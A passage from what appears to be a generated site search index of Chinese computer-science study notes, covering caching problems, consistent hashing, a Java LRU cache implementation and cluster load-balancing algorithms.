Byte\u3001Short\u3001Character\u3001Integer\u3001Long\u3001Boolean \u8FD9\u516D\u79CD\u5305\u88C5\u7C7B\u7F13\u51B2\u6C60\u3002"},{header:"CPU \u591A\u7EA7\u7F13\u5B58",slug:"cpu-\u591A\u7EA7\u7F13\u5B58",content:"CPU \u4E3A\u4E86\u89E3\u51B3\u8FD0\u7B97\u901F\u5EA6\u4E0E\u4E3B\u5B58 IO \u901F\u5EA6\u4E0D\u5339\u914D\u7684\u95EE\u9898\uFF0C\u5F15\u5165\u4E86\u591A\u7EA7\u7F13\u5B58\u7ED3\u6784\uFF0C\u540C\u65F6\u4F7F\u7528 MESI \u7B49\u7F13\u5B58\u4E00\u81F4\u6027\u534F\u8BAE\u6765\u89E3\u51B3\u591A\u6838 CPU \u7F13\u5B58\u6570\u636E\u4E00\u81F4\u6027\u7684\u95EE\u9898\u3002"},{header:"\u4E09\u3001CDN",slug:"\u4E09\u3001cdn",content:`\u5185\u5BB9\u5206\u53D1\u7F51\u7EDC\uFF08Content distribution network\uFF0CCDN\uFF09\u662F\u4E00\u79CD\u4E92\u8FDE\u7684\u7F51\u7EDC\u7CFB\u7EDF\uFF0C\u5B83\u5229\u7528\u66F4\u9760\u8FD1\u7528\u6237\u7684\u670D\u52A1\u5668\u4ECE\u800C\u66F4\u5FEB\u66F4\u53EF\u9760\u5730\u5C06 HTML\u3001CSS\u3001JavaScript\u3001\u97F3\u4E50\u3001\u56FE\u7247\u3001\u89C6\u9891\u7B49\u9759\u6001\u8D44\u6E90\u5206\u53D1\u7ED9\u7528\u6237\u3002
CDN \u4E3B\u8981\u6709\u4EE5\u4E0B\u4F18\u70B9\uFF1A \u66F4\u5FEB\u5730\u5C06\u6570\u636E\u5206\u53D1\u7ED9\u7528\u6237\uFF1B
\u901A\u8FC7\u90E8\u7F72\u591A\u53F0\u670D\u52A1\u5668\uFF0C\u4ECE\u800C\u63D0\u9AD8\u7CFB\u7EDF\u6574\u4F53\u7684\u5E26\u5BBD\u6027\u80FD\uFF1B
\u591A\u53F0\u670D\u52A1\u5668\u53EF\u4EE5\u770B\u6210\u662F\u4E00\u79CD\u5197\u4F59\u673A\u5236\uFF0C\u4ECE\u800C\u5177\u6709\u9AD8\u53EF\u7528\u6027\u3002`},{header:"\u56DB\u3001\u7F13\u5B58\u95EE\u9898",slug:"\u56DB\u3001\u7F13\u5B58\u95EE\u9898",content:""},{header:"\u7F13\u5B58\u7A7F\u900F",slug:"\u7F13\u5B58\u7A7F\u900F",content:`\u6307\u7684\u662F\u5BF9\u67D0\u4E2A\u4E00\u5B9A\u4E0D\u5B58\u5728\u7684\u6570\u636E\u8FDB\u884C\u8BF7\u6C42\uFF0C\u8BE5\u8BF7\u6C42\u5C06\u4F1A\u7A7F\u900F\u7F13\u5B58\u5230\u8FBE\u6570\u636E\u5E93\u3002
\u89E3\u51B3\u65B9\u6848\uFF1A \u5BF9\u8FD9\u4E9B\u4E0D\u5B58\u5728\u7684\u6570\u636E\u7F13\u5B58\u4E00\u4E2A\u7A7A\u6570\u636E\uFF1B
\u5BF9\u8FD9\u7C7B\u8BF7\u6C42\u8FDB\u884C\u8FC7\u6EE4\u3002`},{header:"\u7F13\u5B58\u96EA\u5D29",slug:"\u7F13\u5B58\u96EA\u5D29",content:`\u6307\u7684\u662F\u7531\u4E8E\u6570\u636E\u6CA1\u6709\u88AB\u52A0\u8F7D\u5230\u7F13\u5B58\u4E2D\uFF0C\u6216\u8005\u7F13\u5B58\u6570\u636E\u5728\u540C\u4E00\u65F6\u95F4\u5927\u9762\u79EF\u5931\u6548\uFF08\u8FC7\u671F\uFF09\uFF0C\u53C8\u6216\u8005\u7F13\u5B58\u670D\u52A1\u5668\u5B95\u673A\uFF0C\u5BFC\u81F4\u5927\u91CF\u7684\u8BF7\u6C42\u90FD\u5230\u8FBE\u6570\u636E\u5E93\u3002
\u5728\u6709\u7F13\u5B58\u7684\u7CFB\u7EDF\u4E2D\uFF0C\u7CFB\u7EDF\u975E\u5E38\u4F9D\u8D56\u4E8E\u7F13\u5B58\uFF0C\u7F13\u5B58\u5206\u62C5\u4E86\u5F88\u5927\u4E00\u90E8\u5206\u7684\u6570\u636E\u8BF7\u6C42\u3002\u5F53\u53D1\u751F\u7F13\u5B58\u96EA\u5D29\u65F6\uFF0C\u6570\u636E\u5E93\u65E0\u6CD5\u5904\u7406\u8FD9\u4E48\u5927\u7684\u8BF7\u6C42\uFF0C\u5BFC\u81F4\u6570\u636E\u5E93\u5D29\u6E83\u3002
\u89E3\u51B3\u65B9\u6848\uFF1A \u4E3A\u4E86\u9632\u6B62\u7F13\u5B58\u5728\u540C\u4E00\u65F6\u95F4\u5927\u9762\u79EF\u8FC7\u671F\u5BFC\u81F4\u7684\u7F13\u5B58\u96EA\u5D29\uFF0C\u53EF\u4EE5\u901A\u8FC7\u89C2\u5BDF\u7528\u6237\u884C\u4E3A\uFF0C\u5408\u7406\u8BBE\u7F6E\u7F13\u5B58\u8FC7\u671F\u65F6\u95F4\u6765\u5B9E\u73B0\uFF1B
\u4E3A\u4E86\u9632\u6B62\u7F13\u5B58\u670D\u52A1\u5668\u5B95\u673A\u51FA\u73B0\u7684\u7F13\u5B58\u96EA\u5D29\uFF0C\u53EF\u4EE5\u4F7F\u7528\u5206\u5E03\u5F0F\u7F13\u5B58\uFF0C\u5206\u5E03\u5F0F\u7F13\u5B58\u4E2D\u6BCF\u4E00\u4E2A\u8282\u70B9\u53EA\u7F13\u5B58\u90E8\u5206\u7684\u6570\u636E\uFF0C\u5F53\u67D0\u4E2A\u8282\u70B9\u5B95\u673A\u65F6\u53EF\u4EE5\u4FDD\u8BC1\u5176\u5B83\u8282\u70B9\u7684\u7F13\u5B58\u4ECD\u7136\u53EF\u7528\u3002
\u4E5F\u53EF\u4EE5\u8FDB\u884C\u7F13\u5B58\u9884\u70ED\uFF0C\u907F\u514D\u5728\u7CFB\u7EDF\u521A\u542F\u52A8\u4E0D\u4E45\u7531\u4E8E\u8FD8\u672A\u5C06\u5927\u91CF\u6570\u636E\u8FDB\u884C\u7F13\u5B58\u800C\u5BFC\u81F4\u7F13\u5B58\u96EA\u5D29\u3002`},{header:"\u7F13\u5B58\u4E00\u81F4\u6027",slug:"\u7F13\u5B58\u4E00\u81F4\u6027",content:`\u7F13\u5B58\u4E00\u81F4\u6027\u8981\u6C42\u6570\u636E\u66F4\u65B0\u7684\u540C\u65F6\u7F13\u5B58\u6570\u636E\u4E5F\u80FD\u591F\u5B9E\u65F6\u66F4\u65B0\u3002
\u89E3\u51B3\u65B9\u6848\uFF1A \u5728\u6570\u636E\u66F4\u65B0\u7684\u540C\u65F6\u7ACB\u5373\u53BB\u66F4\u65B0\u7F13\u5B58\uFF1B
\u5728\u8BFB\u7F13\u5B58\u4E4B\u524D\u5148\u5224\u65AD\u7F13\u5B58\u662F\u5426\u662F\u6700\u65B0\u7684\uFF0C\u5982\u679C\u4E0D\u662F\u6700\u65B0\u7684\u5148\u8FDB\u884C\u66F4\u65B0\u3002 \u8981\u4FDD\u8BC1\u7F13\u5B58\u4E00\u81F4\u6027\u9700\u8981\u4ED8\u51FA\u5F88\u5927\u7684\u4EE3\u4EF7\uFF0C\u7F13\u5B58\u6570\u636E\u6700\u597D\u662F\u90A3\u4E9B\u5BF9\u4E00\u81F4\u6027\u8981\u6C42\u4E0D\u9AD8\u7684\u6570\u636E\uFF0C\u5141\u8BB8\u7F13\u5B58\u6570\u636E\u5B58\u5728\u4E00\u4E9B\u810F\u6570\u636E\u3002`},{header:"\u7F13\u5B58 \u201C\u65E0\u5E95\u6D1E\u201D \u73B0\u8C61",slug:"\u7F13\u5B58-\u65E0\u5E95\u6D1E-\u73B0\u8C61",content:`\u6307\u7684\u662F\u4E3A\u4E86\u6EE1\u8DB3\u4E1A\u52A1\u8981\u6C42\u6DFB\u52A0\u4E86\u5927\u91CF\u7F13\u5B58\u8282\u70B9\uFF0C\u4F46\u662F\u6027\u80FD\u4E0D\u4F46\u6CA1\u6709\u597D\u8F6C\u53CD\u800C\u4E0B\u964D\u4E86\u7684\u73B0\u8C61\u3002
\u4EA7\u751F\u539F\u56E0\uFF1A\u7F13\u5B58\u7CFB\u7EDF\u901A\u5E38\u91C7\u7528 hash \u51FD\u6570\u5C06 key \u6620\u5C04\u5230\u5BF9\u5E94\u7684\u7F13\u5B58\u8282\u70B9\uFF0C\u968F\u7740\u7F13\u5B58\u8282\u70B9\u6570\u76EE\u7684\u589E\u52A0\uFF0C\u952E\u503C\u5206\u5E03\u5230\u66F4\u591A\u7684\u8282\u70B9\u4E0A\uFF0C\u5BFC\u81F4\u5BA2\u6237\u7AEF\u4E00\u6B21\u6279\u91CF\u64CD\u4F5C\u4F1A\u6D89\u53CA\u591A\u6B21\u7F51\u7EDC\u64CD\u4F5C\uFF0C\u8FD9\u610F\u5473\u7740\u6279\u91CF\u64CD\u4F5C\u7684\u8017\u65F6\u4F1A\u968F\u7740\u8282\u70B9\u6570\u76EE\u7684\u589E\u52A0\u800C\u4E0D\u65AD\u589E\u5927\u3002\u6B64\u5916\uFF0C\u7F51\u7EDC\u8FDE\u63A5\u6570\u53D8\u591A\uFF0C\u5BF9\u8282\u70B9\u7684\u6027\u80FD\u4E5F\u6709\u4E00\u5B9A\u5F71\u54CD\u3002
\u89E3\u51B3\u65B9\u6848\uFF1A \u4F18\u5316\u6279\u91CF\u6570\u636E\u64CD\u4F5C\u547D\u4EE4\uFF1B
\u51CF\u5C11\u7F51\u7EDC\u901A\u4FE1\u6B21\u6570\uFF1B
\u964D\u4F4E\u63A5\u5165\u6210\u672C\uFF0C\u4F7F\u7528\u957F\u8FDE\u63A5 / \u8FDE\u63A5\u6C60\uFF0CNIO \u7B49\u3002`},{header:"\u4E94\u3001\u6570\u636E\u5206\u5E03",slug:"\u4E94\u3001\u6570\u636E\u5206\u5E03",content:""},{header:"\u54C8\u5E0C\u5206\u5E03",slug:"\u54C8\u5E0C\u5206\u5E03",content:`\u54C8\u5E0C\u5206\u5E03\u5C31\u662F\u5C06\u6570\u636E\u8BA1\u7B97\u54C8\u5E0C\u503C\u4E4B\u540E\uFF0C\u6309\u7167\u54C8\u5E0C\u503C\u5206\u914D\u5230\u4E0D\u540C\u7684\u8282\u70B9\u4E0A\u3002\u4F8B\u5982\u6709 N \u4E2A\u8282\u70B9\uFF0C\u6570\u636E\u7684\u4E3B\u952E\u4E3A key\uFF0C\u5219\u5C06\u8BE5\u6570\u636E\u5206\u914D\u7684\u8282\u70B9\u5E8F\u53F7\u4E3A\uFF1Ahash(key)%N\u3002
\u4F20\u7EDF\u7684\u54C8\u5E0C\u5206\u5E03\u7B97\u6CD5\u5B58\u5728\u4E00\u4E2A\u95EE\u9898\uFF1A\u5F53\u8282\u70B9\u6570\u91CF\u53D8\u5316\u65F6\uFF0C\u4E5F\u5C31\u662F N \u503C\u53D8\u5316\uFF0C\u90A3\u4E48\u51E0\u4E4E\u6240\u6709\u7684\u6570\u636E\u90FD\u9700\u8981\u91CD\u65B0\u5206\u5E03\uFF0C\u5C06\u5BFC\u81F4\u5927\u91CF\u7684\u6570\u636E\u8FC1\u79FB\u3002`},{header:"\u987A\u5E8F\u5206\u5E03",slug:"\u987A\u5E8F\u5206\u5E03",content:`\u5C06\u6570\u636E\u5212\u5206\u4E3A\u591A\u4E2A\u8FDE\u7EED\u7684\u90E8\u5206\uFF0C\u6309\u6570\u636E\u7684 ID \u6216\u8005\u65F6\u95F4\u5206\u5E03\u5230\u4E0D\u540C\u8282\u70B9\u4E0A\u3002\u4F8B\u5982 User \u8868\u7684 ID \u8303\u56F4\u4E3A 1 ~ 7000\uFF0C\u4F7F\u7528\u987A\u5E8F\u5206\u5E03\u53EF\u4EE5\u5C06\u5176\u5212\u5206\u6210\u591A\u4E2A\u5B50\u8868\uFF0C\u5BF9\u5E94\u7684\u4E3B\u952E\u8303\u56F4\u4E3A 1 ~ 1000\uFF0C1001 ~ 2000\uFF0C...\uFF0C6001 ~ 7000\u3002
\u987A\u5E8F\u5206\u5E03\u76F8\u6BD4\u4E8E\u54C8\u5E0C\u5206\u5E03\u7684\u4E3B\u8981\u4F18\u70B9\u5982\u4E0B\uFF1A \u80FD\u4FDD\u6301\u6570\u636E\u539F\u6709\u7684\u987A\u5E8F\uFF1B
\u5E76\u4E14\u80FD\u591F\u51C6\u786E\u63A7\u5236\u6BCF\u53F0\u670D\u52A1\u5668\u5B58\u50A8\u7684\u6570\u636E\u91CF\uFF0C\u4ECE\u800C\u4F7F\u5F97\u5B58\u50A8\u7A7A\u95F4\u7684\u5229\u7528\u7387\u6700\u5927\u3002`},{header:"\u516D\u3001\u4E00\u81F4\u6027\u54C8\u5E0C",slug:"\u516D\u3001\u4E00\u81F4\u6027\u54C8\u5E0C",content:"Distributed Hash Table\uFF08DHT\uFF09 \u662F\u4E00\u79CD\u54C8\u5E0C\u5206\u5E03\u65B9\u5F0F\uFF0C\u5176\u76EE\u7684\u662F\u4E3A\u4E86\u514B\u670D\u4F20\u7EDF\u54C8\u5E0C\u5206\u5E03\u5728\u670D\u52A1\u5668\u8282\u70B9\u6570\u91CF\u53D8\u5316\u65F6\u5927\u91CF\u6570\u636E\u8FC1\u79FB\u7684\u95EE\u9898\u3002"},{header:"\u57FA\u672C\u539F\u7406",slug:"\u57FA\u672C\u539F\u7406",content:"\u5C06\u54C8\u5E0C\u7A7A\u95F4 [0, 2n-1] \u770B\u6210\u4E00\u4E2A\u54C8\u5E0C\u73AF\uFF0C\u6BCF\u4E2A\u670D\u52A1\u5668\u8282\u70B9\u90FD\u914D\u7F6E\u5230\u54C8\u5E0C\u73AF\u4E0A\u3002\u6BCF\u4E2A\u6570\u636E\u5BF9\u8C61\u901A\u8FC7\u54C8\u5E0C\u53D6\u6A21\u5F97\u5230\u54C8\u5E0C\u503C\u4E4B\u540E\uFF0C\u5B58\u653E\u5230\u54C8\u5E0C\u73AF\u4E2D\u987A\u65F6\u9488\u65B9\u5411\u7B2C\u4E00\u4E2A\u5927\u4E8E\u7B49\u4E8E\u8BE5\u54C8\u5E0C\u503C\u7684\u8282\u70B9\u4E0A\u3002 \u4E00\u81F4\u6027\u54C8\u5E0C\u5728\u589E\u52A0\u6216\u8005\u5220\u9664\u8282\u70B9\u65F6\u53EA\u4F1A\u5F71\u54CD\u5230\u54C8\u5E0C\u73AF\u4E2D\u76F8\u90BB\u7684\u8282\u70B9\uFF0C\u4F8B\u5982\u4E0B\u56FE\u4E2D\u65B0\u589E\u8282\u70B9 X\uFF0C\u53EA\u9700\u8981\u5C06\u5B83\u524D\u4E00\u4E2A\u8282\u70B9 C \u4E0A\u7684\u6570\u636E\u91CD\u65B0\u8FDB\u884C\u5206\u5E03\u5373\u53EF\uFF0C\u5BF9\u4E8E\u8282\u70B9 A\u3001B\u3001D \u90FD\u6CA1\u6709\u5F71\u54CD\u3002"},{header:"\u865A\u62DF\u8282\u70B9",slug:"\u865A\u62DF\u8282\u70B9",content:`\u4E0A\u9762\u63CF\u8FF0\u7684\u4E00\u81F4\u6027\u54C8\u5E0C\u5B58\u5728\u6570\u636E\u5206\u5E03\u4E0D\u5747\u5300\u7684\u95EE\u9898\uFF0C\u8282\u70B9\u5B58\u50A8\u7684\u6570\u636E\u91CF\u6709\u53EF\u80FD\u4F1A\u5B58\u5728\u5F88\u5927\u7684\u4E0D\u540C\u3002
\u6570\u636E\u4E0D\u5747\u5300\u4E3B\u8981\u662F\u56E0\u4E3A\u8282\u70B9\u5728\u54C8\u5E0C\u73AF\u4E0A\u5206\u5E03\u7684\u4E0D\u5747\u5300\uFF0C\u8FD9\u79CD\u60C5\u51B5\u5728\u8282\u70B9\u6570\u91CF\u5F88\u5C11\u7684\u60C5\u51B5\u4E0B\u5C24\u5176\u660E\u663E\u3002
\u89E3\u51B3\u65B9\u5F0F\u662F\u901A\u8FC7\u589E\u52A0\u865A\u62DF\u8282\u70B9\uFF0C\u7136\u540E\u5C06\u865A\u62DF\u8282\u70B9\u6620\u5C04\u5230\u771F\u5B9E\u8282\u70B9\u4E0A\u3002\u865A\u62DF\u8282\u70B9\u7684\u6570\u91CF\u6BD4\u771F\u5B9E\u8282\u70B9\u6765\u5F97\u591A\uFF0C\u90A3\u4E48\u865A\u62DF\u8282\u70B9\u5728\u54C8\u5E0C\u73AF\u4E0A\u5206\u5E03\u7684\u5747\u5300\u6027\u5C31\u4F1A\u6BD4\u539F\u6765\u7684\u771F\u5B9E\u8282\u70B9\u597D\uFF0C\u4ECE\u800C\u4F7F\u5F97\u6570\u636E\u5206\u5E03\u4E5F\u66F4\u52A0\u5747\u5300\u3002`},{header:"\u4E03\u3001LRU",slug:"\u4E03\u3001lru",content:`\u4EE5\u4E0B\u662F\u57FA\u4E8E \u53CC\u5411\u94FE\u8868 + HashMap \u7684 LRU \u7B97\u6CD5\u5B9E\u73B0\uFF0C\u5BF9\u7B97\u6CD5\u7684\u89E3\u91CA\u5982\u4E0B\uFF1A \u8BBF\u95EE\u67D0\u4E2A\u8282\u70B9\u65F6\uFF0C\u5C06\u5176\u4ECE\u539F\u6765\u7684\u4F4D\u7F6E\u5220\u9664\uFF0C\u5E76\u91CD\u65B0\u63D2\u5165\u5230\u94FE\u8868\u5934\u90E8\u3002\u8FD9\u6837\u5C31\u80FD\u4FDD\u8BC1\u94FE\u8868\u5C3E\u90E8\u5B58\u50A8\u7684\u5C31\u662F\u6700\u8FD1\u6700\u4E45\u672A\u4F7F\u7528\u7684\u8282\u70B9\uFF0C\u5F53\u8282\u70B9\u6570\u91CF\u5927\u4E8E\u7F13\u5B58\u6700\u5927\u7A7A\u95F4\u65F6\u5C31\u6DD8\u6C70\u94FE\u8868\u5C3E\u90E8\u7684\u8282\u70B9\u3002
\u4E3A\u4E86\u4F7F\u5220\u9664\u64CD\u4F5C\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(1)\uFF0C\u5C31\u4E0D\u80FD\u91C7\u7528\u904D\u5386\u7684\u65B9\u5F0F\u627E\u5230\u67D0\u4E2A\u8282\u70B9\u3002HashMap \u5B58\u50A8\u7740 Key \u5230\u8282\u70B9\u7684\u6620\u5C04\uFF0C\u901A\u8FC7 Key \u5C31\u80FD\u4EE5 O(1) \u7684\u65F6\u95F4\u5F97\u5230\u8282\u70B9\uFF0C\u7136\u540E\u518D\u4EE5 O(1) \u7684\u65F6\u95F4\u5C06\u5176\u4ECE\u53CC\u5411\u961F\u5217\u4E2D\u5220\u9664\u3002 public class LRU<K, V> implements Iterable<K> { private Node head; private Node tail; private HashMap<K, Node> map; private int maxSize; private class Node { Node pre; Node next; K k; V v; public Node(K k, V v) { this.k = k; this.v = v; } } public LRU(int maxSize) { this.maxSize = maxSize; this.map = new HashMap<>(maxSize * 4 / 3); head = new Node(null, null); tail = new Node(null, null); head.next = tail; tail.pre = head; } public V get(K key) { if (!map.containsKey(key)) { return null; } Node node = map.get(key); unlink(node); appendHead(node); return node.v; } public void put(K key, V value) { if (map.containsKey(key)) { Node node = map.get(key); unlink(node); } Node node = new Node(key, value); map.put(key, node); appendHead(node); if (map.size() > maxSize) { Node toRemove = removeTail(); map.remove(toRemove.k); } } private void unlink(Node node) { Node pre = node.pre; Node next = node.next; pre.next = next; next.pre = pre; node.pre = null; node.next = null; } private void appendHead(Node node) { Node next = head.next; node.next = next; next.pre = node; node.pre = head; head.next = node; } private Node removeTail() { Node node = tail.pre; Node pre = node.pre; tail.pre = pre; pre.next = tail; node.pre = null; node.next = null; return node; } @Override public Iterator<K> iterator() { return new Iterator<K>() { private Node cur = head.next; @Override public boolean hasNext() { return cur != tail; } @Override public K next() { Node node = cur; cur = cur.next; return node.k; } }; }
}`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`\u5927\u89C4\u6A21\u5206\u5E03\u5F0F\u5B58\u50A8\u7CFB\u7EDF
\u7F13\u5B58\u90A3\u4E9B\u4E8B
\u4E00\u81F4\u6027\u54C8\u5E0C\u7B97\u6CD5
\u5185\u5BB9\u5206\u53D1\u7F51\u7EDC
How Aspiration CDN helps to improve your website loading speed?`}]},{path:"/java/%E9%9B%86%E7%BE%A4.html",title:"\u96C6\u7FA4",pathLocale:"/",contents:[{header:"\u96C6\u7FA4",slug:"\u96C6\u7FA4",content:`\u96C6\u7FA4 \u4E00\u3001\u8D1F\u8F7D\u5747\u8861 \u8D1F\u8F7D\u5747\u8861\u7B97\u6CD5 1. \u8F6E\u8BE2\uFF08Round Robin\uFF09
2. \u52A0\u6743\u8F6E\u8BE2\uFF08Weighted Round Robbin\uFF09
3. \u6700\u5C11\u8FDE\u63A5\uFF08least Connections\uFF09
4. \u52A0\u6743\u6700\u5C11\u8FDE\u63A5\uFF08Weighted Least Connection\uFF09
5. \u968F\u673A\u7B97\u6CD5\uFF08Random\uFF09
6. \u6E90\u5730\u5740\u54C8\u5E0C\u6CD5 (IP Hash) \u8F6C\u53D1\u5B9E\u73B0 1. HTTP \u91CD\u5B9A\u5411
2. DNS \u57DF\u540D\u89E3\u6790
3. \u53CD\u5411\u4EE3\u7406\u670D\u52A1\u5668
4. \u7F51\u7EDC\u5C42
5. \u94FE\u8DEF\u5C42 \u4E8C\u3001\u96C6\u7FA4\u4E0B\u7684 Session \u7BA1\u7406 Sticky Session
Session Replication
Session Server`},{header:"\u4E00\u3001\u8D1F\u8F7D\u5747\u8861",slug:"\u4E00\u3001\u8D1F\u8F7D\u5747\u8861",content:`\u96C6\u7FA4\u4E2D\u7684\u5E94\u7528\u670D\u52A1\u5668\uFF08\u8282\u70B9\uFF09\u901A\u5E38\u88AB\u8BBE\u8BA1\u6210\u65E0\u72B6\u6001\uFF0C\u7528\u6237\u53EF\u4EE5\u8BF7\u6C42\u4EFB\u4F55\u4E00\u4E2A\u8282\u70B9\u3002
\u8D1F\u8F7D\u5747\u8861\u5668\u4F1A\u6839\u636E\u96C6\u7FA4\u4E2D\u6BCF\u4E2A\u8282\u70B9\u7684\u8D1F\u8F7D\u60C5\u51B5\uFF0C\u5C06\u7528\u6237\u8BF7\u6C42\u8F6C\u53D1\u5230\u5408\u9002\u7684\u8282\u70B9\u4E0A\u3002
\u8D1F\u8F7D\u5747\u8861\u5668\u53EF\u4EE5\u7528\u6765\u5B9E\u73B0\u9AD8\u53EF\u7528\u4EE5\u53CA\u4F38\u7F29\u6027\uFF1A \u9AD8\u53EF\u7528\uFF1A\u5F53\u67D0\u4E2A\u8282\u70B9\u6545\u969C\u65F6\uFF0C\u8D1F\u8F7D\u5747\u8861\u5668\u4F1A\u5C06\u7528\u6237\u8BF7\u6C42\u8F6C\u53D1\u5230\u53E6\u5916\u7684\u8282\u70B9\u4E0A\uFF0C\u4ECE\u800C\u4FDD\u8BC1\u6240\u6709\u670D\u52A1\u6301\u7EED\u53EF\u7528\uFF1B
\u4F38\u7F29\u6027\uFF1A\u6839\u636E\u7CFB\u7EDF\u6574\u4F53\u8D1F\u8F7D\u60C5\u51B5\uFF0C\u53EF\u4EE5\u5F88\u5BB9\u6613\u5730\u6DFB\u52A0\u6216\u79FB\u9664\u8282\u70B9\u3002 \u8D1F\u8F7D\u5747\u8861\u5668\u8FD0\u884C\u8FC7\u7A0B\u5305\u542B\u4E24\u4E2A\u90E8\u5206\uFF1A \u6839\u636E\u8D1F\u8F7D\u5747\u8861\u7B97\u6CD5\u5F97\u5230\u8F6C\u53D1\u7684\u8282\u70B9\uFF1B
\u8FDB\u884C\u8F6C\u53D1\u3002`},{header:"\u8D1F\u8F7D\u5747\u8861\u7B97\u6CD5",slug:"\u8D1F\u8F7D\u5747\u8861\u7B97\u6CD5",content:""},{header:"1. \u8F6E\u8BE2\uFF08Round Robin\uFF09",slug:"_1-\u8F6E\u8BE2-round-robin",content:`\u8F6E\u8BE2\u7B97\u6CD5\u628A\u6BCF\u4E2A\u8BF7\u6C42\u8F6E\u6D41\u53D1\u9001\u5230\u6BCF\u4E2A\u670D\u52A1\u5668\u4E0A\u3002
\u4E0B\u56FE\u4E2D\uFF0C\u4E00\u5171\u6709 6 \u4E2A\u5BA2\u6237\u7AEF\u4EA7\u751F\u4E86 6 \u4E2A\u8BF7\u6C42\uFF0C\u8FD9 6 \u4E2A\u8BF7\u6C42\u6309 (1, 2, 3, 4, 5, 6) \u7684\u987A\u5E8F\u53D1\u9001\u3002(1, 3, 5) \u7684\u8BF7\u6C42\u4F1A\u88AB\u53D1\u9001\u5230\u670D\u52A1\u5668 1\uFF0C(2, 4, 6) \u7684\u8BF7\u6C42\u4F1A\u88AB\u53D1\u9001\u5230\u670D\u52A1\u5668 2\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9daa3616-00a4-48c4-9146-792dc8499be3.jpg" width="500px)
\u8BE5\u7B97\u6CD5\u6BD4\u8F83\u9002\u5408\u6BCF\u4E2A\u670D\u52A1\u5668\u7684\u6027\u80FD\u5DEE\u4E0D\u591A\u7684\u573A\u666F\uFF0C\u5982\u679C\u6709\u6027\u80FD\u5B58\u5728\u5DEE\u5F02\u7684\u60C5\u51B5\u4E0B\uFF0C\u90A3\u4E48\u6027\u80FD\u8F83\u5DEE\u7684\u670D\u52A1\u5668\u53EF\u80FD\u65E0\u6CD5\u627F\u62C5\u8FC7\u5927\u7684\u8D1F\u8F7D\uFF08\u4E0B\u56FE\u7684 Server 2\uFF09\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bfea8772-d01b-4a51-8adc-edfd7d3dce84.jpg" width="500px)`},{header:"2. \u52A0\u6743\u8F6E\u8BE2\uFF08Weighted Round Robbin\uFF09",slug:"_2-\u52A0\u6743\u8F6E\u8BE2-weighted-round-robbin",content:`\u52A0\u6743\u8F6E\u8BE2\u662F\u5728\u8F6E\u8BE2\u7684\u57FA\u7840\u4E0A\uFF0C\u6839\u636E\u670D\u52A1\u5668\u7684\u6027\u80FD\u5DEE\u5F02\uFF0C\u4E3A\u670D\u52A1\u5668\u8D4B\u4E88\u4E00\u5B9A\u7684\u6743\u503C\uFF0C\u6027\u80FD\u9AD8\u7684\u670D\u52A1\u5668\u5206\u914D\u66F4\u9AD8\u7684\u6743\u503C\u3002
\u4F8B\u5982\u4E0B\u56FE\u4E2D\uFF0C\u670D\u52A1\u5668 1 \u88AB\u8D4B\u4E88\u7684\u6743\u503C\u4E3A 5\uFF0C\u670D\u52A1\u5668 2 \u88AB\u8D4B\u4E88\u7684\u6743\u503C\u4E3A 1\uFF0C\u90A3\u4E48 (1, 2, 3, 4, 5) \u8BF7\u6C42\u4F1A\u88AB\u53D1\u9001\u5230\u670D\u52A1\u5668 1\uFF0C(6) \u8BF7\u6C42\u4F1A\u88AB\u53D1\u9001\u5230\u670D\u52A1\u5668 2\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4ab87717-e264-4232-825d-8aaf08f14e8b.jpg" width="500px)`},{header:"3. \u6700\u5C11\u8FDE\u63A5\uFF08least Connections\uFF09",slug:"_3-\u6700\u5C11\u8FDE\u63A5-least-connections",content:`\u7531\u4E8E\u6BCF\u4E2A\u8BF7\u6C42\u7684\u8FDE\u63A5\u65F6\u95F4\u4E0D\u4E00\u6837\uFF0C\u4F7F\u7528\u8F6E\u8BE2\u6216\u8005\u52A0\u6743\u8F6E\u8BE2\u7B97\u6CD5\u7684\u8BDD\uFF0C\u53EF\u80FD\u4F1A\u8BA9\u4E00\u53F0\u670D\u52A1\u5668\u5F53\u524D\u8FDE\u63A5\u6570\u8FC7\u5927\uFF0C\u800C\u53E6\u4E00\u53F0\u670D\u52A1\u5668\u7684\u8FDE\u63A5\u8FC7\u5C0F\uFF0C\u9020\u6210\u8D1F\u8F7D\u4E0D\u5747\u8861\u3002
\u4F8B\u5982\u4E0B\u56FE\u4E2D\uFF0C(1, 3, 5) \u8BF7\u6C42\u4F1A\u88AB\u53D1\u9001\u5230\u670D\u52A1\u5668 1\uFF0C\u4F46\u662F (1, 3) \u5F88\u5FEB\u5C31\u65AD\u5F00\u8FDE\u63A5\uFF0C\u6B64\u65F6\u53EA\u6709 (5) \u8BF7\u6C42\u8FDE\u63A5\u670D\u52A1\u5668 1\uFF1B(2, 4, 6) \u8BF7\u6C42\u88AB\u53D1\u9001\u5230\u670D\u52A1\u5668 2\uFF0C\u53EA\u6709 (2) \u7684\u8FDE\u63A5\u65AD\u5F00\uFF0C\u6B64\u65F6 (6, 4) \u8BF7\u6C42\u8FDE\u63A5\u670D\u52A1\u5668 2\u3002\u8BE5\u7CFB\u7EDF\u7EE7\u7EED\u8FD0\u884C\u65F6\uFF0C\u670D\u52A1\u5668 2 \u4F1A\u627F\u62C5\u8FC7\u5927\u7684\u8D1F\u8F7D\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e98deb5a-d5d4-4294-aa9b-9220d4483403.jpg" width="500px)
\u6700\u5C11\u8FDE\u63A5\u7B97\u6CD5\u5C31\u662F\u5C06\u8BF7\u6C42\u53D1\u9001\u7ED9\u5F53\u524D\u6700\u5C11\u8FDE\u63A5\u6570\u7684\u670D\u52A1\u5668\u4E0A\u3002
\u4F8B\u5982\u4E0B\u56FE\u4E2D\uFF0C\u670D\u52A1\u5668 1 \u5F53\u524D\u8FDE\u63A5\u6570\u6700\u5C0F\uFF0C\u90A3\u4E48\u65B0\u5230\u6765\u7684\u8BF7\u6C42 6 \u5C31\u4F1A\u88AB\u53D1\u9001\u5230\u670D\u52A1\u5668 1 \u4E0A\u3002
